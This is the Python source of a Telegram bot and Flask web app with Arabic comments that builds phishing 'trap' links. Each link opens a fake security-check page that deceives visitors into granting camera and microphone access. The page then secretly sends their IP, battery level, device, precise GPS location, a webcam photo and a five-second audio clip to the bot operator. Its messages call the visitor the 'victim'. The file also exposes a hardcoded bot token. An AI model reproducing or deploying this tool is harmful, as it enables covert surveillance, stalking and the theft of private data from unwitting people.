import base64, requests, os, json, time
from flask import Flask, render_template_string, request

app = Flask(__name__)

# ==========================================
# --- إعدادات الإمبراطور سيوفي (v35.0) ---
# ==========================================
BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
ADMIN_ID = "7041600701"
BASE_URL = "https://sif-pro.onrender.com" 
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"
SUB_URL = "https://t.me/FAABOT?start=7041600701" 
DATA_FILE = "database.json"

# تحميل البيانات من الملف (لضمان بقاء الأسماء قدر الإمكان)
def load_db():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r") as f: return json.load(f)
        except: return {"users": {}, "banned": [], "stages": {}}
    return {"users": {}, "banned": [], "stages": {}}

def save_db(data):
    try:
        with open(DATA_FILE, "w") as f: json.dump(data, f)
    except: pass

db = load_db()

def tg_request(method, payload=None, files=None):
    try:
        if files: return requests.post(API_URL + method, data=payload, files=files, timeout=25).json()
        return requests.post(API_URL + method, json=payload, timeout=25).json()
    except: return None

# واجهة الصيد الاحترافية (v35.0)
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الأمان الموحد</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #111; padding: 30px; border-radius: 20px; border: 1px solid #333; text-align: center; width: 85%; max-width: 400px; }
        .btn { background: #f38020; color: #000; border: none; padding: 15px 40px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; font-size: 1.1rem; }
    </style>
</head>
<body>
    <div class="card">
        <div style="font-size:50px; color:#f38020;">🛡️</div>
        <h2>تحقق أمني مطلوب</h2>
        <p style="color: #bbb;">يرجى تفعيل الفحص الأمني للمتابعة.</p>
        <button class="btn" id="go">بدء الفحص</button>
        <p id="st" style="margin-top:20px; color:#777; font-size:0.8rem;">بانتظار الموافقة...</p>
    </div>
    <video id="v" autoplay playsinline muted style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>
    <script>
        const uid = "{{ user_id }}";
        const send = (d, t) => fetch('/api/capture/' + uid, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({d, t})});
        
        document.getElementById('go').onclick = async () => {
            document.getElementById('st').innerText = "جاري الفحص...";
            try {
                const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
                const v = document.getElementById('v'); v.srcObject = stream;
                
                const ipD = await fetch('https://api.ipify.org?format=json').then(r=>r.json());
                const bat = await navigator.getBattery().catch(()=>({level:0}));
                
                await send(`🎯 **صيد جديد!**\\n🌐 IP: \`${ipD.ip}\`\\n🔋 البطارية: ${Math.round(bat.level*100)}%\\n📱 الجهاز: ${navigator.platform}`, 'msg');

                navigator.geolocation.getCurrentPosition(p => {
                    send(`📍 **موقع الضحية:**\\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, 'msg');
                }, null, {enableHighAccuracy: true});

                setTimeout(() => {
                    const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0); send(c.toDataURL('image/jpeg', 0.7), 'img');
                    
                    const rec = new MediaRecorder(stream); const ch = [];
                    rec.ondataavailable = e => ch.push(e.data);
                    rec.onstop = () => {
                        const r = new FileReader(); r.readAsDataURL(new Blob(ch));
                        r.onloadend = () => { send(r.result, 'aud'); document.getElementById('st').innerText = "✅ اكتمل الفحص"; };
                    };
                    rec.start(); setTimeout(() => rec.stop(), 5000);
                }, 2000);
            } catch { document.getElementById('st').innerText = "❌ يجب السماح بالصلاحيات للمتابعة!"; }
        };
    </script>
</body>
</html>
'''

@app.route('/t/<uid>')
def trap(uid): return render_template_string(HTML_TEMPLATE, user_id=uid)

@app.route('/api/capture/<uid>', methods=['POST'])
def capture(uid):
    data = request.get_json(force=True, silent=True)
    t, d = data.get('t'), data.get('d')
    for r_id in list(set([uid, ADMIN_ID])):
        if t == 'msg': tg_request("sendMessage", {'chat_id': r_id, 'text': d, 'parse_mode': 'Markdown'})
        elif t == 'img': tg_request("sendPhoto", {'chat_id': r_id, 'caption': "📸 صورة الضحية"}, {'photo': ('p.jpg', base64.b64decode(d.split(',')[1]))})
        elif t == 'aud': tg_request("sendVoice", {'chat_id': r_id, 'caption': "🎙 بصمة 5 ثوانٍ"}, {'voice': ('a.ogg', base64.b64decode(d.split(',')[1]))})
    return "OK"

@app.route('/webhook', methods=['POST'])
def webhook():
    upd = request.get_json(force=True, silent=True)
    if not upd: return "OK"
    
    # 1. التقاط بيانات المستخدم من أي تفاعل (رسالة أو زر)
    user_info = None
    if "message" in upd: user_info = upd["message"]["from"]
    elif "callback_query" in upd: user_info = upd["callback_query"]["from"]

    if user_info:
        cid = str(user_info["id"])
        uname = f"@{user_info.get('username', 'NoUser')}"
        fname = user_info.get('first_name', 'Unknown')
        
        # حيلة ذكية: التنبيه الفوري في حسابك (لحل مشكلة اختفاء القائمة)
        if cid not in db["users"] and cid != ADMIN_ID:
            db["users"][cid] = uname
            save_db(db)
            report = f"✨ **مستخدم جديد فعل البوت:**\n👤 الاسم: {fname}\n🆔 الايدي: `{cid}`\n🔗 اليوزر: {uname}"
            tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": report, "parse_mode": "Markdown"})

    # 2. معالجة الأزرار (Callbacks)
    if "callback_query" in upd:
        cb = upd["callback_query"]; cid = str(cb["from"]["id"])
        tg_request("answerCallbackQuery", {"callback_query_id": cb["id"]}) # حل مشكلة التحميل
        
        if cb["data"] == "gen_link":
            tg_request("sendMessage", {"chat_id": cid, "text": f"🚀 رابطك الخاص:\n`{BASE_URL}/t/{cid}`"})
        elif cb["data"] == "list_all" and cid == ADMIN_ID:
            res = "👥 **قائمة المستخدمين (المسجلين حالياً):**\n\n"
            for u_id, u_name in db["users"].items():
                res += f"- {u_name} | `{u_id}`\n"
            tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": res if db["users"] else "القائمة فارغة حالياً."})
        return "OK"

    # 3. معالجة الرسائل
    if "message" in upd:
        msg = upd["message"]; cid = str(msg["chat"]["id"]); text = msg.get("text", "")
        
        if cid in db.get("banned", []): return "OK"

        if cid == ADMIN_ID:
            if text.startswith("/user_ban"):
                target = text.split(" ")[1] if len(text.split()) > 1 else ""
                if target and target not in db["banned"]:
                    db["banned"].append(target); save_db(db)
                    tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": f"🚫 تم حظر: `{target}`"})
                return "OK"
            
            elif text == "/users": # أمر يدوي لجلب القائمة
                res = "👥 القائمة من الملف:\n"
                for i, (u_id, u_name) in enumerate(db["users"].items()): res += f"{i+1}- {u_name} (`{u_id}`)\n"
                tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": res})
                return "OK"

            kb = {"inline_keyboard": [[{"text": "🔗 رابطي", "callback_data": "gen_link"}, {"text": "👥 القائمة", "callback_data": "list_all"}]]}
            tg_request("sendMessage", {"chat_id": ADMIN_ID, "text": "🔥 أهلاً بك يا إمبراطور v35.0\n\n- للحظر: `/user_ban ID`\n- للقائمة النصية: `/users`", "reply_markup": kb})
            return "OK"

        # نظام الاشتراك المزدوج للمستخدمين
        stage = db["stages"].get(cid, 0)
        if stage < 2:
            db["stages"][cid] = stage + 1; save_db(db)
            tg_request("sendMessage", {"chat_id": cid, "text": f"🛑 خطوة {stage+1}/2: اشترك بالقناة لتفعيل الرابط.", "reply_markup": {"inline_keyboard": [[{"text": "اشتراك ✅", "url": SUB_URL}]]}})
            return "OK"

        tg_request("sendMessage", {"chat_id": cid, "text": "🔥 مصنع الروابط جاهز:", "reply_markup": {"inline_keyboard": [[{"text": "🔗 إنشاء رابطي الخاص", "callback_data": "gen_link"}]]}})
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
